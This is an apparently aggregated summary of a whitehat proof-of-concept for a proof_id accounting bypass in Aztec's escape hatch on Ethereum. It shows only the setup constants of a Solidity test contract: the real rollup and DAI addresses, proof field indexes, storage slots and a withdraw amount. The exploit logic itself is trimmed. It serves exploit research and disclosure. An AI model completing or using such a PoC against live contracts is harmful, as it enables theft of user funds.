# [?] Aztec Escape Hatch - proof_id Accounting Bypass (whitehat reproduction)

## Summary
Severity: Unknown
Chain: Ethereum
Component: AztecEscapeHatch_exp2
Published: 2026-06-22
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/AztecEscapeHatch_exp2.sol
Type: defi-exploit-poc

## Details
Lost: N/A (purely educational; worst-case impact would have been ~$2M, matching the separate vulnerability that actually drained the contracts)

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    address internal constant ROLLUP = 0x737901bea3eeb88459df9ef1BE8fF3Ae1B42A2ba;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant FAKE_INPUT_OWNER = 0x1111111111111111111111111111111111111111;
    address internal constant RECEIVER = 0x2222222222222222222222222222222222222222;
    string internal constant PROOFS = "src/test/2026-06/aztec_escape_hatch_proofs.txt";

    uint256 internal constant OPEN_ESCAPE_BLOCK = 25_295_800;
    uint256 internal constant ASSET_DAI = 1;
    uint256 internal constant WITHDRAW_AMOUNT = 150_000 ether;

    // Proof field indexes, not byte offsets. Escape proof layout starts with 14 rollup public inputs.
    uint256 internal constant ROLLUP_SIZE = 1;
    uint256 internal constant OLD_DATA_ROOT = 3;
    uint256 internal constant NEW_DATA_ROOT = 4;
    uint256 internal constant OLD_NULL_ROOT = 5;
    uint256 internal constant NEW_NULL_ROOT = 6;
    uint256 internal constant OLD_ROOT_ROOT = 7;
    uint256 internal constant NEW_ROOT_ROOT = 8;
    uint256 internal constant INNER_PROOF_ID = 14;
    uint256 internal constant INNER_PUBLIC_INPUT = 15;
    uint256 internal constant INNER_PUBLIC_OUTPUT = 16;
    uint256 internal constant INNER_ASSET_ID = 17;
    uint256 internal constant INNER_OUTPUT_OWNER = 25;

    // RollupProcessorV2 storage slots.
    bytes32 internal constant SLOT_DATA_ROOT = bytes32(uint256(1));
    bytes32 internal constant SLOT_NULL_ROOT = bytes32(uint256(2));
    bytes32 internal constant SLOT_ROOT_ROOT = bytes32(uint256(3));
    bytes32 internal constant SLOT_DATA_SIZE = bytes32(uint256(4));
    bytes32 internal constant SLOT_NEXT_ROLLUP_ID = bytes32(uint256(5));

    IRollupProcessorV2 internal constant rollup = IRollupProcessorV2(ROLLUP);
    IERC20Minimal internal constant dai = IERC20Minimal(DAI);

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/AztecEscapeHatch_exp2.sol_
